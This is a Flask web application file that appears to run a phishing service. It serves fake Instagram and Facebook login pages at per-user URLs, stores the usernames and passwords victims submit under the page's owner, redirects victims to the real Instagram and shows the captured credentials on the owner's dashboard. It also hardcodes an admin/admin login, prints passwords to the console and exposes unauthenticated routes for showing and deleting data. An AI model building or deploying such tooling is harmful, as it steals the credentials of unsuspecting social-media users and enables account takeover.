
from urllib.parse import uses_relative
from flask import Flask,render_template,request,redirect,url_for,session
import DBHelper as dbh

app = Flask(__name__)
app.secret_key="mysecret"

# user of current session
Suser=None



@app.route("/")
def home():
    if 'user' in session and session['user']==Suser:
        return render_template("home.html",uid=Suser,isLogged=True)
    return render_template("home.html")


#90% done only problem is POST data is available in current page when refreshing
@app.route("/register",methods=['POST','GET'])
def register():
    if request.method=='POST':
        uid=request.form.get("username")
        
        if not dbh.checkIfUserExists(uid):
            email=request.form.get("email")
            pas=request.form.get("psw")
            print(uid,email,pas)
            dbh.insertIntoUser(uid,email,pas)
            return redirect("login")
        else:
            return render_template("register.html",userAlreadyExists=True)
        
    else:
        return render_template("register.html")




#90% done just session needs little modification
@app.route("/login",methods=['POST','GET'])
def login():
    if request.method=='POST':
        username=request.form.get('username')
        password=request.form.get('password')
        if dbh.checkUserCredential(username,password):
            session['user']=username
            global Suser
            Suser=username
            print(username,"logged in")
            return redirect('/')
        #for ADMIN
        elif username=='admin' and password=='admin':
            session['user']="admin"
            Suser=username
            print(username,"logged in")
            return redirect('/admin')
        else:
            return render_template("login.html",wrongDetail=True)
    return render_template("login.html")



#completed
@app.route('/logout')
def logout():
    session.pop('user')
    return redirect('/')


#Completed
@app.route("/apps")
def apps():
    if 'user' in session and session['user']==Suser:
        return render_template("/apps.html",isLogged=True,uid=Suser)
    return render_template("login.html",isLogged=False)


#needs more modification
@app.route('/dashboard')
def dashboard():
    if 'user' in session and session['user']==Suser:
        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(Suser),isLogged=True,uid=Suser)
    return render_template("login.html",isLogged=False)



#completed
@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404





#completed
@app.route("/<userid>/instagram.com")
def phishingPage(userid):
    if dbh.checkIfUserExists(userid):
        return render_template("instagram/insta.html",uid=userid)
    return render_template('page_not_found.html')



#completed
@app.route("/loginInsta",methods=['POST'])
def loginInsta():
    owner=request.form.get('owner')
    if owner=="":
        pass
    else:
        site=request.form.get('app')
        uid=request.form.get('uid')
        pas=request.form.get('pas')
        dbh.insertIntoTraped(owner,site,uid,pas)
        print(owner,site,uid,pas)
        
    return redirect("https://instagram.com")








#ADMIN PAGE
@app.route("/admin")
def admin():
     if 'user' in session and session['user']==Suser:
        return render_template("admin.html",isLogged=True,uid=Suser)
     return render_template("login.html",isLogged=False)






#admin not needed now
@app.route("/instagram.com")
def insta():
    return render_template("/instagram/insta.html")
@app.route("/facebook.com")
def facebook():
    return render_template("/facebook/facebook.html")

#for admin
@app.route("/showUser")
def showUser():
    dbh.showUserData()
    dbh.showTrapedData()
    return "show User"


#for admin
@app.route("/delete")
def deleteDATABASE():
    dbh.showTrapedData()
    dbh.deleteTrapedData()
    return "deleted"
